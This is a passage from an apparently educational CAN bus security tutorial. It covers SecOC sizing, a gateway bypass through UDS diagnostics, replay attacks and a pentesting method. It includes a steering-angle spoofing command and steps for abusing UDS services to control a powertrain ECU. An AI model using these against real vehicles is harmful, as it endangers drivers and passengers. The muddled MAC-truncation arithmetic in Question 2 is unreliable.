- Gateway ECU monitors message frequency per CAN ID
- If CAN ID 0x050 exceeds threshold (e.g., > 100 msg/sec), gateway blocks it
- Requires gateway to be upstream of attacker (e.g., attacker on infotainment bus)

**Defense 2: IDS Detection + ECU Isolation**

- IDS detects abnormal bus load (> 80% utilization)
- IDS identifies source of flooding (if possible, by monitoring physical layer)
- Gateway disconnects suspected malicious ECU from bus

**Defense 3: Physically Secure OBD-II Port**

- Prevent attacker from connecting device to OBD-II port in the first place
- Lockable cover, or relocate OBD-II port to secure location

Question 2: SecOC Implementation (Difficulty: Hard)
----------------------------------------------------

An automotive OEM wants to protect safety-critical CAN messages using AUTOSAR
SecOC. The vehicle has the following safety-critical messages:

- **CAN ID 0x100**: Engine RPM (sent every 10ms)
- **CAN ID 0x200**: Brake pressure (sent every 10ms)
- **CAN ID 0x244**: Steering angle (sent every 10ms)

Each message is 8 bytes. The OEM wants to add a 24-bit MAC and an 8-bit counter
for freshness.

**a)** Calculate the new SecOC message length. Will it fit in a standard CAN frame?

**b)** If not, propose two solutions.

**Answer:**

**a) Message Length Calculation:**

Original message: 8 bytes (data payload)

SecOC overhead:
- **Freshness value**: 8 bits = 1 byte
- **MAC**: 24 bits = 3 bytes

Total: 8 + 1 + 3 = **12 bytes**

**Problem:**

Standard CAN frame supports only **8 bytes** of data. SecOC message (12 bytes)
does **not fit**.

**b) Solutions:**

**Solution 1: Use CAN-FD**

- CAN-FD supports up to **64 bytes** per frame
- 12-byte SecOC message fits comfortably
- Requires all ECUs on bus to support CAN-FD

**Solution 2: Split Message Across Multiple Frames**

- Send original data (8 bytes) in first CAN frame (ID 0x100)
- Send SecOC metadata (freshness + MAC = 4 bytes) in second frame (ID 0x101)
- Receiver reconstructs and verifies both frames together
- Drawback: Increased latency, risk of frames arriving out of order

**Solution 3: Reduce Data Payload**

- Reduce original data from 8 bytes to 4 bytes
- Allows SecOC overhead (4 bytes) to fit in 8-byte CAN frame
- Requires redesigning message format (may not be feasible)

**Solution 4: Truncate MAC**

- Use shorter MAC (e.g., 16 bits instead of 24 bits)
- Reduces SecOC overhead: 1 byte (freshness) + 2 bytes (MAC) = 3 bytes
- Total: 8 + 3 = 11 bytes → still doesn't fit
- Use 12-bit MAC: 1 + 1.5 = 2.5 bytes → Round up to 3 bytes → still 11 bytes
- **Best**: Use 16-bit freshness + 16-bit MAC = 4 bytes overhead
- Reduce data to 4 bytes: 4 + 4 = 8 bytes → fits!

**Recommendation:**

Use **CAN-FD** if possible (cleanest solution). Otherwise, reduce data payload
or split across multiple frames.

Question 3: Gateway Attack (Difficulty: Hard)
----------------------------------------------

A vehicle has three CAN buses:

- **Infotainment CAN**: Radio, navigation (low security)
- **Powertrain CAN**: Engine, transmission (high security)
- **Chassis CAN**: ABS, airbags (high security)

A gateway ECU connects all three buses with the following filtering rules:

.. code-block:: text

    Infotainment → Powertrain: DENY ALL
    Infotainment → Chassis: DENY ALL
    Powertrain ↔ Chassis: ALLOW ALL
    Powertrain → Infotainment: ALLOW (0x100, 0x161 only)

An attacker compromises the infotainment ECU. The attacker discovers that
sending CAN ID **0x7DF** (UDS diagnostic request) bypasses the gateway filter.

**a)** Explain why diagnostic messages might bypass gateway filters.

**b)** How can the attacker use this to control the powertrain?

**c)** Propose three mitigations.

**Answer:**

**a) Why Diagnostics Bypass Gateway:**

**CAN ID 0x7DF** is the **broadcast diagnostic request** (UDS - Unified
Diagnostic Services, ISO 14229). It is used by:

- OBD-II scanners to query all ECUs
- Service tools for maintenance

Gateway ECUs often allow diagnostic messages to pass through because:

1. **Functional requirement**: Technicians need to diagnose ECUs on all buses
2. **Legacy compatibility**: Older vehicles did not filter diagnostics
3. **Misconfiguration**: Security was not considered during gateway design

**b) Attack Steps:**

1. **Send UDS diagnostic request (CAN ID 0x7DF)**:
   
   - Gateway forwards it to powertrain CAN (bypass filter)

2. **Use UDS service 0x2E (Write Data By Identifier)**:
   
   - Write to powertrain ECU memory (e.g., modify throttle setpoint)

3. **Use UDS service 0x31 (Routine Control)**:
   
   - Execute a routine in powertrain ECU (e.g., start/stop engine)

4. **Use UDS service 0x27 (Security Access)**:
   
   - Attempt to unlock ECU (if security seed/key is weak)

**Result:**

Attacker gains control of powertrain ECU despite gateway filter.

**c) Mitigations:**

**Mitigation 1: Restrict Diagnostic Access by Source**

- Gateway allows CAN ID 0x7DF only from **OBD-II port**, not from infotainment
- Implement **source-based filtering** (requires gateway to track message origin)

**Mitigation 2: UDS Security Access (ISO 14229)**

- Require **seed/key authentication** for sensitive UDS services (0x2E, 0x31)
- Seed stored in HSM, key derived from challenge-response
- Infotainment ECU does not have key

**Mitigation 3: Rate Limiting for Diagnostics**

- Gateway allows only 1 diagnostic request per second (prevents abuse)
- Legitimate diagnostic tools can function, but attacker cannot flood

**Mitigation 4: Physically Secure OBD-II Port**

- Only allow diagnostics when vehicle is in "service mode" (key in specific
  position, or technician tool authenticated)

Question 4: Replay Attack with SecOC (Difficulty: Medium)
----------------------------------------------------------

An ECU sends the following SecOC-protected message:

.. code-block:: text

    CAN ID: 0x100
    Data: [0x12, 0x34, 0x56, 0x78]
    Freshness: 42
    MAC: 0xABCDEF (24-bit CMAC)

An attacker captures this message and replays it 10 seconds later.

**a)** Will the replay attack succeed if the receiver uses a counter-based
freshness value?

**b)** Will it succeed if the receiver uses a timestamp-based freshness value?

**c)** Propose an additional defense.

**Answer:**

**a) Counter-Based Freshness:**

- Sender increments counter with each message: 42, 43, 44, ...
- Receiver expects: `counter_received > counter_last`

**Attack Result:**

- Attacker replays message with counter = 42
- Receiver's last seen counter = 44 (or higher)
- **42 < 44** → Replay detected, message rejected ✅

**Replay attack FAILS** (SecOC prevents it).

**b) Timestamp-Based Freshness:**

- Sender includes timestamp: 1704067200 (Unix time)
- Receiver checks: `timestamp_received > timestamp_last`

**Attack Result:**

- Attacker replays message with timestamp = 1704067200
- Current time = 1704067210 (10 seconds later)
- **1704067200 < 1704067210** → Timestamp is old
- Receiver has tolerance window (e.g., ±2 seconds)
- **10 seconds > 2 seconds** → Replay detected, message rejected ✅

**Replay attack FAILS** (SecOC prevents it).

**c) Additional Defense:**

**Defense: Freshness Synchronization**

- Sender and receiver synchronize clocks periodically (e.g., via GPS or CAN
  time sync protocol)
- Receiver rejects messages with timestamps outside tolerance window (±2 seconds)
- Prevents both replay (old timestamp) and pre-play (future timestamp)

**Defense: Sequence Number with Sliding Window**

- Receiver maintains a sliding window of accepted sequence numbers
- Example: Accept 40-45, reject < 40 (old) and > 50 (too far ahead)
- Prevents replay and out-of-order delivery attacks

Question 5: CAN Bus Pentesting (Difficulty: Hard)
--------------------------------------------------

You are hired to perform a security assessment of a new electric vehicle. You
have physical access to the OBD-II port. Outline a 5-step penetration testing
methodology for the CAN bus.

**Answer:**

**Step 1: Reconnaissance**

**Goal**: Identify CAN buses, ECUs, and message types.

**Tools**:
- OBD-II adapter (ELM327, CANtact)
- SocketCAN (Linux) or CANopen tools

**Actions**:
1. Connect to OBD-II port
2. Sniff CAN traffic using `candump can0`
3. Identify active CAN IDs and their frequency
4. Reverse-engineer message meaning (e.g., 0x161 = speed, 0x100 = RPM)
5. Create a CAN ID database

**Step 2: Threat Modeling**

**Goal**: Identify high-value targets and attack scenarios.

**Analysis**:
- Which ECUs control safety-critical functions? (brakes, steering, airbags)
- Which ECUs have external connectivity? (telematics, infotainment)
- Are there gateway ECUs? What are filtering rules?

**Prioritize**:
- Target ECUs with highest safety impact (brakes, steering)
- Target ECUs with external attack surface (telematics, Bluetooth)

**Step 3: Vulnerability Assessment**

**Goal**: Test for known vulnerabilities and misconfigurations.

**Tests**:
1. **Message injection**: Send spoofed CAN messages, observe vehicle response
   
   .. code-block:: bash
   
       cansend can0 244#0000  # Spoof steering angle = 0

2. **Replay attacks**: Capture door unlock, replay later
3. **Fuzzing**: Send random CAN messages, monitor for crashes or anomalies
4. **UDS diagnostic exploitation**: Test UDS services (0x27, 0x2E, 0x31)
5. **Gateway bypass**: Attempt to send messages between isolated buses

**Step 4: Exploitation**

**Goal**: Demonstrate real-world impact of vulnerabilities.

**Examples**:
- **Proof-of-Concept (PoC)**: Unlock doors via CAN injection
- **Safety impact**: Disable ABS by flooding CAN bus
- **Remote attack**: Chain telematics vulnerability + CAN injection

**Documentation**:
- Video recording of attack
- CAN logs (before/after attack)
- Technical write-up

**Step 5: Reporting and Mitigation**

**Goal**: Provide actionable recommendations to OEM.

**Report Structure**:
1. **Executive Summary**: High-level findings
2. **Technical Details**: Vulnerabilities, attack steps, CAN logs
3. **Risk Assessment**: Severity, likelihood, impact (CVSS scores)
4. **Mitigations**:
   - Short-term: OTA firmware update to patch vulnerabilities
   - Medium-term: Implement gateway filtering, SecOC
   - Long-term: Hardware redesign (HSM, secure boot)

**Follow-Up**:
- Coordinate with OEM for responsible disclosure
- Retest after mitigation to verify fix

Conclusion
==========

CAN bus security is critical for automotive, industrial, and aerospace systems.
Native CAN provides **no security** (no authentication, encryption, or access
control), making it vulnerable to:

- Message injection and spoofing
- Replay attacks
- Bus flooding (DoS)
- Eavesdropping

**Defense Strategies:**

1. **AUTOSAR SecOC**: Message authentication and freshness
2. **Network segmentation**: Separate buses with gateway filtering
3. **Intrusion Detection Systems (IDS)**: Monitor for anomalies
4. **Secure boot and code signing**: Prevent ECU malware
5. **Physical security**: Lock OBD-II port, secure supply chain

**Future Directions:**

- CAN-FD adoption for higher bandwidth (supports larger SecOC overhead)
- Standardized encryption for CAN (confidentiality)
- Automotive Ethernet replacing CAN for high-bandwidth applications
- ISO 21434 compliance (cybersecurity engineering for road vehicles)

References
==========

- ISO 11898: Controller Area Network (CAN)
- ISO 15765: Diagnostic communication over CAN (UDS)
- AUTOSAR SecOC: Secure Onboard Communication specification
- ISO 21434: Road vehicles - Cybersecurity engineering
- SAE J1939: CAN protocol for heavy-duty vehicles
- Charlie Miller & Chris Valasek, "Remote Exploitation of an Unaltered
  Passenger Vehicle" (2015)
- NIST SP 800-82: Guide to Industrial Control Systems Security

**END OF DOCUMENT**
